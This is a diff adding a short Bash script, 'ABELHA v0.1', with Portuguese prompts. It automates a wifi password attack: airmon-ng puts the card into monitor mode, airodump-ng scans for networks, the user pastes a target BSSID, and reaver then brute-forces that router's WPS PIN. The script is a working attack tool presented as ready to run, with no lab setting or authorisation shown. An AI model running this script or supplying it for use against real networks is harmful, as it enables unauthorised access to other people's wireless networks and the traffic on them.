@@ -1,0 +1,53 @@
+#!/bin/bash
+
+clear
+
+echo ""
+echo ".         .             .                 .            . "
+echo "     .        .                    .           .         "
+echo "                                                         "
+echo "  ..  .  .   SEJA BEM VINDO AO ABELHA : v 0.1  .  .  ..  "
+echo "                                                         "
+echo "         .                .                   .       .  "
+echo "                        .                .              ."
+echo "   .                                                .    "
+echo ""
+echo "Vamos pesquisar!.. "
+echo ""
+echo "Digite a sua interface wifi: "
+
+read wifi
+
+# Transformar interface wifi em monitoramento
+
+echo "Interface $wifi em monitoramento: "
+sleep 1s
+
+airmon-ng start $wifi
+
+# Pesquisar redes ativas
+echo ""
+echo "iniciando pesquisas de redes..."
+sleep 1s
+echo ""
+echo "Tecle Ctrl+C p/ parar o scaneamento."
+sleep 2s
+
+airodump-ng mon0
+
+echo ""
+echo "**********************************"
+echo "Copie o BSSID do alvo e cole abaixo:"
+
+read bssid
+
+# Quebrar senha
+
+echo ""
+echo "Quebrando senha..."
+sleep 1s
+echo ""
+echo "Faça um café que vai demorar ;) "
+sleep 2s
+
+reaver -i mon0 -b $bssid -vv
